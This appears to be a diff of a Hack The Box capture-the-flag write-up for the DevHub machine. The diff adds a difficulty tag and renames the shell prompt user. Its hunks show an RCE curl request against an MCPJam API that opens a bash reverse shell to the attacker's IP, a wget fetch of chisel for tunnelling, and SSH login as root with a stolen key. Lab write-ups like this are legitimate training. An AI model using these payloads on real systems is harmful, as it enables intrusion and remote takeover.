@@ -1,6 +1,7 @@
 +++
 title = "DevHub - Privilege escalation through hidden API endpoints"
 date = 2026-06-24T16:25:48Z
+difficulty = "medium"
 tags = ["HTB - Medium", "Linux", "Pentesting"]
 description = "Pwning the DevHub machine from HTB."
 +++
@@ -9,7 +10,7 @@ description = "Pwning the DevHub machine from HTB."
 ## **RECON**
 After obtaining the target machine's IP address, I ran an nmap scan to identify open TCP ports:
 ```bash
-┌──(root㉿esteban)-[~/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# nmap -sS -oN nmap_scan.txt 10.129.37.179                   
 ```
 The scan revealed two open TCP ports for SSH and HTTP:
@@ -53,17 +54,17 @@ This version of **MCPJam** is susceptible to *RCE* through malicious HTTP reques
 &nbsp;  
 First, I had to set up my **listener**:
 ```bash
-┌──(root㉿esteban)-[~/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# nc -lvnp 4444  
 listening on [any] 4444 ...
 ```
 And run the **curl** command I been hyping up:
 ```bash
-┌──(root㉿esteban)-[~/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# curl http://devhub.htb:6274/api/mcp/connect --header "Content-Type: application/json" --data '{"serverConfig":{"command":"/bin/bash","args":["-c", "bash -i >& /dev/tcp/10.10.16.192/4444 0>&1"],"env":{}},"serverId":"letmein"}' -k
 ```
 ```bash
-┌──(root㉿esteban)-[~/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# nc -lvnp 4444  
 listening on [any] 4444 ...
 connect to [10.10.16.192] from (UNKNOWN) [10.129.37.179] 36154
@@ -104,7 +105,7 @@ The ports that I haven't yet explored were ports **5000** and **8888**. I went a
 &nbsp;  
 First, needed to setup an **http server** to serve the script from my attacker:
 ```bash
-┌──(root㉿esteban)-[~/Scripts]
+┌──(root㉿pangelinan)-[~/Scripts]
 └─# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
@@ -114,7 +115,7 @@ mcp-dev@devhub:~$ wget http://10.10.16.192:8000/chisel && chmod +x chisel
 ```
 Once that was complete, I ran the **chisel server** from my attacker: 
 ```bash
-┌──(root㉿esteban)-[~/Scripts]
+┌──(root㉿pangelinan)-[~/Scripts]
 └─# chisel server -p 8000 --reverse
 2026/06/24 16:57:47 server: Reverse tunnelling enabled
 2026/06/24 16:57:47 server: Fingerprint Ob1WDAOoieLOxWIAWPVfhwTFKyIr9S/0zaZ2W8mDHxw=
@@ -418,13 +419,13 @@ Now that I got that, all I needed to do was copy the contents of the **private k
 ## **PRIVESC**
 ```bash
 # In nano, I pasted the contents of the key
-┌──(root㉿esteban)-[~/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# nano root_key  
 # Then, I set its permissions                                                
-┌──(root㉿esteban)-[~/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# chmod 600 root_key             
 # Finally, I got connected                     
-┌──(root㉿esteban)-[~/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# ssh -i root_key root@10.129.37.179
 The authenticity of host '10.129.37.179 (10.129.37.179)' can't be established.
 ED25519 key fingerprint is SHA256:K64LcxfMoWF9TY77Q+quN1nvBzFftQ11ZxoH8eULpCs.
